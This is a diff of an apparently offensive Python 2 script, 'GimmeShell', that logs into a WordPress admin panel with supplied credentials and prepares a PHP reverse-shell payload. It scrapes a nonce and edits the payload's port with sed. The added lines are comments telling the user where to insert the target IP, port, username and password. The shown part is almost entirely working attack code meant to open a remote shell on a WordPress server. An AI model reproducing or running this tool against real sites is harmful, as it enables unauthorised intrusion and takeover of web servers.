@@ -1,11 +1,12 @@
 #!/usr/bin/env python
 
-# Upload PHP reverse shell to WordPress.
+# Upload PHP reverse shell to WordPress with valid credentials.
 
 import requests, sys, re, thread, os
 
 class GimmeShell(object):
-
+    # setup external payload (i.e. php-reverse-shell.php) with IP/port
+    # and setup IP in each session.get/session.post
     def __init__(self, portnum):
 	self.portnum = portnum
 	self._login()
@@ -13,6 +14,7 @@ class GimmeShell(object):
 
     def _login(self):
 	print "[*] Attempting Login."
+	# add valid username in log value and pass in pwd value
         self.data = {"log":"","pwd":"","wp-submit":"Log In"}
         self.session = requests.session()
         self.response = self.session.post('http:///wp/wp-login.php', self.data, allow_redirects=True)
@@ -45,6 +47,7 @@ class GimmeShell(object):
     	if self.value:
             self.nonce = self.value.group()[7:17]
 	    print "[+] %s" % (self.nonce)
+	# change port value in external file 
 	self.portchangecmd = "sed -i -e 's/\$port = [[:digit:]]*;/\$port = " + str(self.portnum) + ";/g' php-reverse-shell.php"
 	os.system(self.portchangecmd)
 	print "[*] Generating payload..."
